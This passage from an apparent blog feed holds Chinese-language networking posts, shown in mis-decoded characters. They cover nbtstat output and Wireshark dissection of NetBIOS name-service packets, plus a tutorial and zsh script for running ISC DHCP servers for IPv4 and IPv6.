    DIAS           &lt;00&gt;  ç»„           å·²æ³¨å†Œ
    DIAS           &lt;1E&gt;  ç»„           å·²æ³¨å†Œ

    MAC åœ°å€ = E4-42-A6-18-AB-00
</code></pre>
<p><code>nbtstat -A IP_Address</code>ç”¨äºè¯·æ±‚æŒ‡å®šIPæ‰€åœ¨è®¾å¤‡çš„åç§°è¡¨ã€‚</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -A 192.168.1.12

eth0:
èŠ‚ç‚¹ IP å€å€: [192.168.1.14] èŒƒå›´ ID: []

           NetBIOS è¿œç¨‹è®¡ç®—æœºåç§°è¡¨

       åç§°               ç±»å‹         çŠ¶æ€
    ---------------------------------------------
    DZ-DN-700      &lt;20&gt;  å”¯ä¸€          å·²æ³¨å†Œ
    DZ-DN-700      &lt;00&gt;  å”¯ä¸€          å·²æ³¨å†Œ
    DIAS           &lt;00&gt;  ç»„           å·²æ³¨å†Œ
    DIAS           &lt;1E&gt;  ç»„           å·²æ³¨å†Œ
    DIAS           &lt;1D&gt;  å”¯ä¸€          å·²æ³¨å†Œ
    ..__MSBROWSE__.&lt;01&gt;  ç»„           å·²æ³¨å†Œ

    MAC åœ°å€ = E4-42-A6-18-AB-00
</code></pre>
<p><code>nbtstat -c</code>ç”¨äºæŸ¥çœ‹å½“å‰è®¾å¤‡ç¼“å­˜ä¸­çš„åç§°è¡¨ï¼Œæ³¨æ„æ¯ä¸ªåç§°éƒ½æ˜¯å¯ä»¥è¢«ä¿®æ”¹çš„ï¼Œæ‰€ä»¥éœ€è¦å®šæ—¶åˆ·æ–°ï¼ŒåŒæ—¶æ¯ä¸ªåç§°éƒ½æœ‰å…¶å¯¿å‘½ï¼Œå¯¿å‘½è€—å°½åéœ€è¦é‡æ–°è¯·æ±‚ã€‚</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -c

eth0:
èŠ‚ç‚¹ IP å€å€: [192.168.1.14] èŒƒå›´ ID: []

                  NetBIOS è¿œç¨‹ç¼“å­˜åç§°è¡¨

        åç§°              ç±»å‹       ä¸»æœºåœ°å€    å¯¿å‘½[ç§’]
    ------------------------------------------------------------
    DZ-DN-700      &lt;20&gt;  å”¯ä¸€              192.168.1.12        269
    DZ-DN-700      &lt;00&gt;  å”¯ä¸€              192.168.1.12        269
</code></pre>
<p><code>nbtstat -n</code>ç”¨äºæŸ¥çœ‹å½“å‰è®¾å¤‡çš„æœ¬åœ°åç§°è¡¨ï¼Œä¸ç¬¬ä¸€ä¸ªä¾‹å­ä¸€æ ·ã€‚</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -n

eth0:
èŠ‚ç‚¹ IP å€å€: [192.168.1.14] èŒƒå›´ ID: []

                NetBIOS æœ¬åœ°åç§°è¡¨

       åç§°               ç±»å‹         çŠ¶æ€
    ---------------------------------------------
    DT-LITREILY    &lt;20&gt;  å”¯ä¸€          å·²æ³¨å†Œ
    DT-LITREILY    &lt;00&gt;  å”¯ä¸€          å·²æ³¨å†Œ
    WORKGROUP      &lt;00&gt;  ç»„           å·²æ³¨å†Œ
</code></pre>
<p><code>nbtstat -r</code>ç”¨äºæŸ¥çœ‹é€šè¿‡å¹¿æ’­å’Œç»ç”± WINS è§£æçš„åç§°</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -r

    NetBIOS åç§°è§£æå’Œæ³¨å†Œç»Ÿè®¡
    ----------------------------------------------------

    é€šè¿‡å¹¿æ’­è§£æçš„     = 5
    é€šè¿‡åç§°æœåŠ¡å™¨è§£æ   = 0

    é€šè¿‡å¹¿æ’­æ³¨å†Œçš„   = 3
    é€šè¿‡åç§°æœåŠ¡å™¨æ³¨å†Œçš„ = 0

    é€šè¿‡å¹¿æ’­è§£æçš„ NetBIOS åç§°
    ---------------------------------------------
           DZ-DN-700      &lt;00&gt;
           DZ-DN-700      &lt;00&gt;
           DZ-DN-700      &lt;00&gt;
           DIAS           &lt;00&gt;
           DZ-DN-700      &lt;00&gt;
</code></pre>
<p><code>nbtstat -s</code>ä¸<code>nbtstat -S</code>éƒ½ç”¨äºä¼šè¯æœåŠ¡ä¿¡æ¯æŸ¥è¯¢ï¼Œå› ä¸ºæ²¡æœ‰è¿æ¥æ‰€ä»¥ä¿¡æ¯ä¸ºç©ºã€‚</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -s

eth0:
èŠ‚ç‚¹ IP å€å€: [192.168.1.14] èŒƒå›´ ID: []

    æ— è¿æ¥

C:\WINDOWS\system32&gt;nbtstat -S

eth0:
èŠ‚ç‚¹ IP å€å€: [192.168.1.14] èŒƒå›´ ID: []

    æ— è¿æ¥
</code></pre>
<p><code>nbtstat -R</code>ç”¨äºæ¸…é™¤ç¼“å­˜ï¼Œæ¸…é™¤åå†ç”¨<code>-c</code>æŸ¥çœ‹å°±ä¼šæ˜¾ç¤ºæ²¡æœ‰åç§°äº†ã€‚</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -R
    NBT è¿œç¨‹ç¼“å­˜åç§°è¡¨çš„æˆåŠŸæ¸…é™¤å’Œé¢„åŠ è½½ã€‚

C:\WINDOWS\system32&gt;nbtstat -c

eth0:
èŠ‚ç‚¹ IP å€å€: [192.168.1.14] èŒƒå›´ ID: []

    ç¼“å­˜ä¸­æ²¡æœ‰åç§°
</code></pre>
<p><code>nbtstat -RR</code>ç”¨äºåˆ·æ–°ç»æœ¬æœºæ³¨å†Œçš„NetBIOSåç§°ï¼Œé—´éš”ä¸€æ®µæ—¶é—´æ–¹èƒ½åˆ·æ–°ç¬¬äºŒæ¬¡ã€‚</p>
<pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -RR
    å·²ç»åˆ·æ–°ç»è¿‡æ­¤è®¡ç®—æœºæ³¨å†Œçš„ NetBIOS åç§°ã€‚
</code></pre>
<h2 id="Windows-é…ç½®NetBIOS"><a href="#Windows-é…ç½®NetBIOS" class="headerlink" title="Windows é…ç½®NetBIOS"></a>Windows é…ç½®NetBIOS</h2><p>åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­ï¼Œå¯ä»¥æ‰“å¼€æŸç½‘å¡çš„å±æ€§é…ç½®ï¼Œç„¶åé€‰æ‹©IPv4é…ç½®çš„é«˜çº§é€‰é¡¹ï¼Œ<code>WINS</code>é€‰é¡¹å¡å³å¯é…ç½®<code>NetBIOS</code>ã€‚é»˜è®¤æƒ…å†µæ˜¯å¯ç”¨çš„ï¼Œä¸ä¸‹å›¾æ‰€ç¤ºä¸€è‡´ã€‚</p>
<p><img src="/assets/network/nbns/netbios_config.png" alt="Windowsä¸Šçš„NetBIOSé…ç½®"></p>
<h2 id="wireshark-å®ä¾‹åˆ†æ"><a href="#wireshark-å®ä¾‹åˆ†æ" class="headerlink" title="wireshark å®ä¾‹åˆ†æ"></a>wireshark å®ä¾‹åˆ†æ</h2><p>æœ€åæ¥åˆ†æä¸¤ä¸ªä½¿ç”¨wiresharkæŠ“çš„NBNSæ•°æ®åŒ…ï¼Œä»¥ä¾¿æ›´ç›´è§‚çš„ç†è§£å’Œè®°å¿†ã€‚</p>
<h3 id="Node-Status"><a href="#Node-Status" class="headerlink" title="Node Status"></a>Node Status</h3><p>ä½¿ç”¨æŒ‡ä»¤<code>nbtstat -A 192.168.1.12</code>å‘æŒ‡å®šè®¾å¤‡å‘é€Node status queryï¼Œä½¿ç”¨wiresharkæŠ“åŒ…ã€‚</p>
<p><img src="/assets/network/nbns/nodestatus_ws.png" alt="nbns node status"></p>
<p>è¯·æ±‚æ•°æ®åŒ…å¦‚ä¸‹ï¼š</p>
<p><img src="/assets/network/nbns/nodestatus_ws_query.png" alt="nbns node status query"></p>
<p>ä»wiresharkå¾—åˆ°çš„è§£ææ•°æ®å¦‚ä¸‹ï¼š</p>
<pre><code class="yml">0000   e4 42 a6 18 ab 00 00 e0 4c 5a 0a 78 08 00 45 00   Ã¤BÂ¦.Â«..Ã LZ.x..E.
0010   00 4e 1e 82 00 00 80 11 98 b2 c0 a8 01 0e c0 a8   .N.......Â²Ã€Â¨..Ã€Â¨
0020   01 0c 00 89 00 89 00 3a 5a 12 e2 b1 00 00 00 01   .......:Z.Ã¢Â±....
0030   00 00 00 00 00 00 20 43 4b 41 41 41 41 41 41 41   ...... CKAAAAAAA
0040   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
0050   41 41 41 41 41 41 41 00 00 21 00 01               AAAAAAA..!..

NetBIOS Name Service
    Transaction ID: 0xe2b1
    Flags: 0x0000, Opcode: Name query
        0... .... .... .... = Response: Message is a query
        .000 0... .... .... = Opcode: Name query (0)
        .... ..0. .... .... = Truncated: Message is not truncated
        .... ...0 .... .... = Recursion desired: Do not do query recursively
        .... .... ...0 .... = Broadcast: Not a broadcast packet
    Questions: 1
    Answer RRs: 0
    Authority RRs: 0
    Additional RRs: 0
    Queries
        *&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;: type NBSTAT, class IN
            Name: *&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt; (Workstation/Redirector)
            Type: NBSTAT (33)
            Class: IN (1)
</code></pre>
<p>è¯¥æ•°æ®æŠ¥åŒ…å«ä¸€ä¸ªè¯·æ±‚ï¼Œæ‰€ä»¥<code>Questions</code>ä¸º1ï¼Œå…¶ä½™ä¸º0ï¼›è¯·æ±‚åŒ…ä¸­çš„ç¼–ç åç§°ä¸º<code>*</code>çš„ç¼–ç åæ•°æ®CKAAAAAAAAAAAAAAA...; ç”±äºä½¿ç”¨çš„æ˜¯æŒ‡å®šIPï¼Œæ‰€ä»¥æ˜¯å•æ’­åŒ…ï¼›å› ä¸ºæ˜¯NODE STATUS REQUEST, æ‰€ä»¥QUESTION_TYPEæ˜¯NBSTAT(0x0021).</p>
<p>ä»æŒ‡å®šè®¾å¤‡è·å–åˆ°çš„å“åº”æ•°æ®å¦‚ä¸‹ï¼š</p>
<p><img src="/assets/network/nbns/nodestatus_ws_response.png" alt="nbns node status response"></p>
<p>ä»æˆªå›¾ä¸­å·²ç»å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°æ•°æ®æ ¼å¼åŠå…·ä½“å†…å®¹äº†ï¼Œè¢«æŠ˜å çš„åç§°ä¿¡æ¯ä¸­ï¼Œ<code>DZ-DN-700&lt;20&gt;</code>ä¸<code>DIAS&lt;1e&gt;</code>å¦‚ä¸‹ï¼š</p>
<pre><code class="yml">0000   00 e0 4c 5a 0a 78 e4 42 a6 18 ab 00 08 00 45 00   ..LZ.x........E.
0010   00 cb 53 50 00 00 80 11 63 67 c0 a8 01 0c c0 a8   ..SP....cg......
0020   01 0e 00 89 00 89 00 b7 01 c0                     .........

0020                                 e2 b1 84 00 00 00            .......
0030   00 01 00 00 00 00 20 43 4b 41 41 41 41 41 41 41   ...... CKAAAAAAA
0040   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
0050   41 41 41 41 41 41 41 00 00 21 00 01 00 00 00 00   AAAAAAA..!......
0060   00 77 04                                          .w.

0060            44 5a 2d 44 4e 2d 37 30 30 20 20 20 20      DZ-DN-700    
0070   20 20 20 04 00                                       ..
Name: DZ-DN-700&lt;20&gt; (Server service)
Name flags: 0x0400, ONT: B-node, Name is active
    0... .... .... .... = Name type: Unique name
    .00. .... .... .... = ONT: B-node (0)
    ...0 .... .... .... = Name is being deregistered: No
    .... 0... .... .... = Name is in conflict: No
    .... .1.. .... .... = Name is active: Yes
    .... ..0. .... .... = Permanent node name: No

0070                  44 5a 2d 44 4e 2d 37 30 30 20 20        DZ-DN-700  
0080   20 20 20 20 00 04 00                                  ...
Name: DZ-DN-700&lt;00&gt; (Workstation/Redirector)
Name flags: 0x0400, ONT: B-node, Name is active
    0... .... .... .... = Name type: Unique name
    .00. .... .... .... = ONT: B-node (0)
    ...0 .... .... .... = Name is being deregistered: No
    .... 0... .... .... = Name is in conflict: No
    .... .1.. .... .... = Name is active: Yes
    .... ..0. .... .... = Permanent node name: No

0080                        44 49 41 53 20 20 20 20 20          DIAS     
0090   20 20 20 20 20 20 00 84 00                              ...
Name: DIAS&lt;00&gt; (Workstation/Redirector)
Name flags: 0x8400, Name type, ONT: B-node, Name is active
    1... .... .... .... = Name type: Group name
    .00. .... .... .... = ONT: B-node (0)
    ...0 .... .... .... = Name is being deregistered: No
    .... 0... .... .... = Name is in conflict: No
    .... .1.. .... .... = Name is active: Yes
    .... ..0. .... .... = Permanent node name: No

0090                              44 49 41 53 20 20 20            DIAS   
00a0   20 20 20 20 20 20 20 20 1e 84 00                          ...
Name: DIAS&lt;1e&gt; (Browser Election Service)
Name flags: 0x8400, Name type, ONT: B-node, Name is active
    1... .... .... .... = Name type: Group name
    .00. .... .... .... = ONT: B-node (0)
    ...0 .... .... .... = Name is being deregistered: No
    .... 0... .... .... = Name is in conflict: No
    .... .1.. .... .... = Name is active: Yes
    .... ..0. .... .... = Permanent node name: No

00a0                                    e4 42 a6 18 ab              .B...
00b0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
00c0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
00d0   00 00 00 00 00 00 00 00 00                        .........
</code></pre>
<h3 id="Name-Registration"><a href="#Name-Registration" class="headerlink" title="Name Registration"></a>Name Registration</h3><p><img src="/assets/network/nbns/registration_ws.png" alt="nbns registration"></p>
<p>NBNSåç§°æ³¨å†Œè¯·æ±‚åŒ…å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="/assets/network/nbns/registration_ws_pkt.png" alt="nbns registration query"></p>
<p>è¯·æ±‚åŒ…æ ¼å¼ä¸<a href="#NAME-REGISTRATION-REQUEST">NAME REGISTRATION REQUEST</a>ä¸­çš„ä¸€è‡´ã€‚ä½¿ç”¨å¹¿æ’­åŒ…æ–¹å¼ï¼Œ<code>OPCODE</code>ä¸º5ï¼ŒåŒ…å«ä¸€æ¡Questionsè®°å½•å’ŒAdditionalè®°å½•ï¼Œæ³¨å†Œåœ°å€ä¸ºå‘é€æ–¹çš„IPåœ°å€192.168.1.12.</p>
<p>åœ¨å±€åŸŸç½‘å†…çš„å…¶å®ƒè®¾å¤‡æˆ–è·¯ç”±å™¨æ¥æ”¶åˆ°è¯¥å¹¿æ’­åŒ…åï¼Œå³å¯å°†å…¶åç§°å’ŒIPåœ°å€è®°å½•åˆ°æœ¬åœ°ç¼“å­˜å½“ä¸­ã€‚</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li><a href="https://tools.ietf.org/html/rfc1001" target="_blank" rel="noopener">rfc1001 - protocol standard for a nETbios service on a tcp/udp transport: concepts and methods</a></li>
<li><a href="https://tools.ietf.org/html/rfc1002" target="_blank" rel="noopener">rfc1002 - protocol standard for a nETbios service on a tcp/udp transport: detailed specifications</a></li>
<li><a href="https://github.com/Litreily/Net_packets/tree/master/NetBIOS" target="_blank" rel="noopener">wiresharkæŠ“åŒ…æ•°æ®</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> Network </category>
            
            <category> Protocol </category>
            
        </categories>
        
        
        <tags>
            
            <tag> wireshark </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Setup dhcpd/dhcpdv6 server]]></title>
      <url>https://www.litreily.top/2020/01/17/dhcpd_server/</url>
      <content type="html"><![CDATA[<p>æ­å»ºDHCP serveråœ¨è®¸å¤šç½‘ç»œåº”ç”¨ä¸­æ˜¯éå¸¸å¿…è¦çš„ï¼Œå°¤å…¶æ˜¯æµ‹è¯•IPv6ç›¸å…³çš„åŠŸèƒ½æ—¶ï¼Œæœ¬æ–‡å°±æ¥ä»‹ç»ä¸‹é’ˆå¯¹IPv4å’ŒIPv6è¯¥å¦‚ä½•æ­å»ºDHCP server.</p>
<h2 id="Install-dhcpd-server"><a href="#Install-dhcpd-server" class="headerlink" title="Install dhcpd server"></a>Install dhcpd server</h2><p>é¦–å…ˆé€šè¿‡<code>apt</code>å®‰è£…<code>isc-dhcp-server</code></p>
<pre><code class="bash">sudo apt install isc-dhcp-server
</code></pre>
<h2 id="Setup-dhcpd"><a href="#Setup-dhcpd" class="headerlink" title="Setup dhcpd"></a>Setup dhcpd</h2><h3 id="Config-interfaces"><a href="#Config-interfaces" class="headerlink" title="Config interfaces"></a>Config interfaces</h3><p>é€šè¿‡<code>ifconfig</code>è·å–ä»¥å¤ªç½‘å£çš„æ¥å£åç§°, ä¸‹é¢çœç•¥äº†loopbackæ¥å£<code>lo</code>ï¼Œåé¢ä¹Ÿæ˜¯ä¸€æ ·é»˜è®¤çœç•¥ã€‚</p>
<pre><code class="bash">$ ifconfig
enp4s0f0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500
        ether 20:6a:8a:6c:0f:da  txqueuelen 1000 (Ethernet)
        RX packets 154583  bytes 186953698 (186.9 MB)
        RX errors 0  dropped 2  overruns 0  frame 0
        TX packets 77038  bytes 6244250 (6.2 MB)
        Tx erros 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19
</code></pre>
<p>ç¼–è¾‘é…ç½®æ–‡ä»¶<code>/etc/default/isc-dhcp-server</code>ï¼Œä¿®æ”¹æœ€åä¸¤è¡Œï¼Œè®¾ç½®ä¸ºåˆšåˆšè·å–åˆ°çš„interface</p>
<pre><code class="bash">$ tail -n 2 /etc/default/isc-dhcp-server
INTERFACESv4=&quot;enp4s0f0&quot;
INTERFACESv6=&quot;enp4s0f0&quot;
</code></pre>
<h3 id="Config-dhcpd-server"><a href="#Config-dhcpd-server" class="headerlink" title="Config dhcpd server"></a>Config dhcpd server</h3><p>é¦–å…ˆé’ˆå¯¹IPv4é…ç½®dhcpd serverï¼Œé…ç½®æ–‡ä»¶ä¸º<code>/etc/dhcp/dhcpd.conf</code>, é…ç½®å†…å®¹åŒ…æ‹¬ç½‘æ®µï¼Œå­ç½‘æ©ç ï¼Œé»˜è®¤è·¯ç”±ï¼Œé»˜è®¤DNS</p>
<pre><code class="bash">$ tail -n 5 /etc/dhcp/dhcpd.conf
subnet 10.0.0.0 netmask 255.255.255.0 {
    range 10.0.0.10 10.0.0.99;
    option routers 10.0.0.138;
    option domain-name-servers 10.0.0.138;
}
</code></pre>
<h3 id="Add-static-ipv4"><a href="#Add-static-ipv4" class="headerlink" title="Add static ipv4"></a>Add static ipv4</h3><p>æ­¤æ—¶åªè¦å†ç»™ç½‘å£è®¾ç½®ä¸€ä¸ªé™æ€IPå°±å¯ä»¥äº†</p>
<pre><code class="bash">sudo ifconfig enp4s0f0 10.0.0.138 netmask 255.255.255.0
</code></pre>
<h3 id="Start-isc-dhcp-server"><a href="#Start-isc-dhcp-server" class="headerlink" title="Start isc-dhcp-server"></a>Start isc-dhcp-server</h3><pre><code class="bash">sudo service isc-dhcp-server start
sudo service isc-dhcp-server status
</code></pre>
<p>é€šè¿‡ç¬¬äºŒæ¡æŒ‡ä»¤å¯ä»¥æŸ¥çœ‹å½“å‰dhcpdçš„çŠ¶æ€ï¼Œæ˜¾ç¤º<code>running</code>è¡¨ç¤ºå·²ç»æ­£å¸¸å·¥ä½œ</p>
<pre><code class="bash">$ sudo service isc-dhcp-server status
â— isc-dhcp-server.service - ISC DHCP IPv4 server
   Loaded: loaded (/lib/systemd/system/isc-dhcp-server.service; enabled; vendor preset: enabled)
   Active: active (running) since Sat 2020-01-18 04:22:28 CST; 7s ago
     Docs: man:dhcpd(8)
 Main PID: 13291 (dhcpd)
    Tasks: 1 (limit: 4915)
   CGroup: /system.slice/isc-dhcp-server.service
           â””â”€13291 dhcpd -user dhcpd -group dhcpd -f -4 -pf /run/dhcp-server/dhcpd.pid -cf /etc/dhcp/dhcpd.conf

1æœˆ 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: PID file: /run/dhcp-server/dhcpd.pid
1æœˆ 18 04:22:28 litreily-Aspire-4750 sh[13291]: Wrote 1 leases to leases file.
1æœˆ 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Wrote 1 leases to leases file.
1æœˆ 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Listening on LPF/enp4s0f0/20:6a:8a:6c:0f:da/10.0.0.0/24
1æœˆ 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Sending on   LPF/enp4s0f0/20:6a:8a:6c:0f:da/10.0.0.0/24
1æœˆ 18 04:22:28 litreily-Aspire-4750 sh[13291]: Listening on LPF/enp4s0f0/20:6a:8a:6c:0f:da/10.0.0.0/24
1æœˆ 18 04:22:28 litreily-Aspire-4750 sh[13291]: Sending on   LPF/enp4s0f0/20:6a:8a:6c:0f:da/10.0.0.0/24
1æœˆ 18 04:22:28 litreily-Aspire-4750 sh[13291]: Sending on   Socket/fallback/fallback-net
1æœˆ 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Sending on   Socket/fallback/fallback-net
1æœˆ 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Server starting service.
</code></pre>
<h2 id="Setup-dhcpdv6"><a href="#Setup-dhcpdv6" class="headerlink" title="Setup dhcpdv6"></a>Setup dhcpdv6</h2><p>é…ç½®IPv6çš„dhcpdä¸IPv4ç±»ä¼¼ï¼Œä¸Šé¢å·²ç»é…ç½®è¿‡<code>/etc/default/interfaces</code>ï¼Œæ­¤å¤„çœç•¥</p>
<h3 id="config-dhcpdv6-server"><a href="#config-dhcpdv6-server" class="headerlink" title="config dhcpdv6 server"></a>config dhcpdv6 server</h3><p>é…ç½®æ–‡ä»¶<code>/etc/dhcp/dhcpd6.conf</code></p>
<pre><code class="bash">$ tail -n 5 /etc/dhcp/dhcpd6.conf
subnet6 2001:470:19:1316::/64 {
    range6 2001:470:19:1316::100 2001:470:19:1316::0fff;
    option dhcp6.name-servers fe80::226a:8aff:fe6c:0fda;
    prefix6 2001:470:19:1316:2:: 2001:470:19:1316:0fff:: /80;
}
</code></pre>
<p>ä¸Šé¢é…ç½®äº†IPv6çš„ç½‘æ®µï¼Œåˆ†é…èŒƒå›´ï¼Œé»˜è®¤dnsï¼Œä»¥åŠIPv6å‰ç¼€</p>
<h3 id="Add-static-IPv6"><a href="#Add-static-IPv6" class="headerlink" title="Add static IPv6"></a>Add static IPv6</h3><p>å¯¹äºIPv6ï¼Œéœ€è¦æ·»åŠ ä¸¤ä¸ªipï¼Œä¸€ä¸ªä»¥<code>fe80::</code>å¼€å¤´çš„æœ¬åœ°ipï¼Œå¦å¤–ä¸€ä¸ªé™æ€global ip</p>
<pre><code class="bash">sudo ifconfig enp4s0f0 inet6 add 2001:470:19:1316::1/64
sudo ifconfig enp4s0f0 inet6 add fe80::226a:8aff:fe6c:fda/64
</code></pre>
<h3 id="Start-isc-dhcp-server6"><a href="#Start-isc-dhcp-server6" class="headerlink" title="Start isc-dhcp-server6"></a>Start isc-dhcp-server6</h3><p>dhcpdv6å¯¹åº”çš„serveråç§°å¤šäº†ä¸ª6ï¼Œå¯åŠ¨æ–¹å¼è‡ªç„¶ä¹Ÿæ˜¯ä¸€æ ·çš„</p>
<pre><code class="bash">sudo service isc-dhcp-server6 start
sudo service isc-dhcp-server6 status
</code></pre>
<h2 id="Notice"><a href="#Notice" class="headerlink" title="Notice"></a>Notice</h2><p>åœ¨æ‰‹åŠ¨é…ç½®æ—¶ï¼Œæ³¨æ„åœ¨å¯åŠ¨æœåŠ¡ä¹‹å‰ï¼Œä¸€å®šè¦è®°å¾—é…ç½®å¥½é™æ€IPï¼Œå¦åˆ™æ— æ³•å¯åŠ¨serverï¼Œå¹¶åœ¨æŸ¥çœ‹çŠ¶æ€æ—¶æ˜¾ç¤ºä»¥ä¸‹ä¿¡æ¯</p>
<pre><code class="bash">$ sudo service isc-dhcp-server status
â— isc-dhcp-server.service - ISC DHCP IPv4 server
   Loaded: loaded (/lib/systemd/system/isc-dhcp-server.service; enabled; vendor preset: enabled)
   Active: failed (Result: exit-code) since Sat 2020-01-18 04:23:23 CST; 10s ago
     Docs: man:dhcpd(8)
  Process: 13864 ExecStart=/bin/sh -ec      CONFIG_FILE=/etc/dhcp/dhcpd.conf;      if [ -f /etc/ltsp/dhcpd.conf ]; then CONFIG_FILE=/etc/ltsp/dhcpd.conf; fi;      [ -e /var/lib/dhcp/dhcpd.leases ] || touch /var/lib/dhcp/dhcpd.leases;      chown root:dhcpd /var/lib/dhcp /var/lib/dhcp/dhcpd.leases;      chmod 775 /var/lib/dhcp ; chmod 664 /var/lib/dhcp/dhcpd.leases;      exec dhcpd -user dhcpd -group dhcpd -f -4 -pf /run/dhcp-server/dhcpd.pid -cf $CONFIG_FILE $INTERFACES (code=exited, status=1/FAILURE)
 Main PID: 13864 (code=exited, status=1/FAILURE)

1æœˆ 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]:
1æœˆ 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: If you think you have received this message due to a bug rather
1æœˆ 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: than a configuration issue please read the section on submitting
1æœˆ 18 04:23:23 litreily-Aspire-4750 systemd[1]: isc-dhcp-server.service: Main process exited, code=exited, status=1/FAILURE
1æœˆ 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: bugs on either our web page at www.isc.org or in the README file
1æœˆ 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: before submitting a bug.  These pages explain the proper
1æœˆ 18 04:23:23 litreily-Aspire-4750 systemd[1]: isc-dhcp-server.service: Failed with result &#39;exit-code&#39;.
1æœˆ 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: process and the information we find helpful for debugging..
1æœˆ 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]:
1æœˆ 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: exiting.
</code></pre>
<h2 id="Shell-script"><a href="#Shell-script" class="headerlink" title="Shell script"></a>Shell script</h2><p>ä¸ºäº†æ–¹ä¾¿é…ç½®serverï¼Œæˆ‘å†™äº†ä¸€ä¸ªç®€å•çš„æ‰§è¡Œè„šæœ¬ï¼Œnetwork servers control, ç®€ç§°<code>nsc</code></p>
<pre><code class="zsh">$ cat nsc
#!/bin/zsh
# network servers control

IFCONFIG=1
INTERFACE=enp4s0f0

IPv4=10.0.0.138
IPv6=2001:470:19:1316::1/64
IPv6_local=fe80::226a:8aff:fe6c:fda/64

stop_dhcp() {
    # stop services
    sudo service isc-dhcp-server stop
    sudo service isc-dhcp-server6 stop

    # del all default ip
    if [ $IFCONFIG -eq 1 ]; then
        sudo ifconfig $INTERFACE 0.0.0.0
        sudo ifconfig $INTERFACE del $IPv6
        sudo ifconfig $INTERFACE del $IPv6_local
    else
        sudo ip addr delete $IPv4/24 dev enp4s0f0
        sudo ip addr delete $IPv6 dev enp4s0f0
        sudo ip addr delete $IPv6_local dev enp4s0f0
    fi
}

start_dhcp() {
    # setup default ip
    if [ $IFCONFIG -eq 1 ]; then
        sudo ifconfig $INTERFACE $IPv4 netmask 255.255.255.0
        sudo ifconfig $INTERFACE inet6 add $IPv6
        sudo ifconfig $INTERFACE inet6 add $IPv6_local
    else
        sudo ip addr add $IPv4/24 dev enp4s0f0
        sudo ip addr add $IPv6 dev enp4s0f0
        sudo ip addr add $IPv6_local dev enp4s0f0
    fi

    # start services
    sudo service isc-dhcp-server start
    [ $? -eq 0 ] &amp;&amp; echo &quot;start dhcpd success!&quot;
    sudo service isc-dhcp-server6 start
    [ $? -eq 0 ] &amp;&amp; echo &quot;start dhcpdv6 success!&quot;
}

case &quot;$1&quot; in
    &quot;stop&quot;)
        stop_dhcp
        ;;
    &quot;start&quot;)
        start_dhcp
        ;;
esac
</code></pre>
<p>è„šæœ¬ä¸­é€šè¿‡<code>$IFCONFIG</code>å˜é‡æ¥é€‰æ‹©ä½¿ç”¨<code>ifconfig</code>æŒ‡ä»¤è¿˜æ˜¯<code>ip</code>æŒ‡ä»¤è¿›è¡Œé…ç½®ã€‚ä½¿ç”¨æ—¶åªéœ€æ‰§è¡Œ<code>nsc start</code>æ‰“å¼€server, æ‰§è¡Œ<code>nsc stop</code>å…³é—­server.</p>
]]></content>
      
        <categories>
            
            <category> Network </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> dhcp </tag>
            
            <tag> ipv6 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ ¹æ®socketç«¯å£å·æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯]]></title>
      <url>https://www.litreily.top/2020/01/15/socket_fd/</url>
      <content type="html"><![CDATA[<p>æ ¹æ®å·²çŸ¥çš„ä¸€ä¸ªç«¯å£å·ï¼Œä»¥telneté»˜è®¤ç«¯å£å·23ä¸ºä¾‹ï¼Œå»æŸ¥æ‰¾ç³»ç»Ÿä¸­ç›‘å¬è¯¥ç«¯å£å·çš„è¿›ç¨‹ï¼Œä¸»è¦å¯ä»¥é€šè¿‡ä¸‹é¢3ç§æ–¹å¼ã€‚</p>
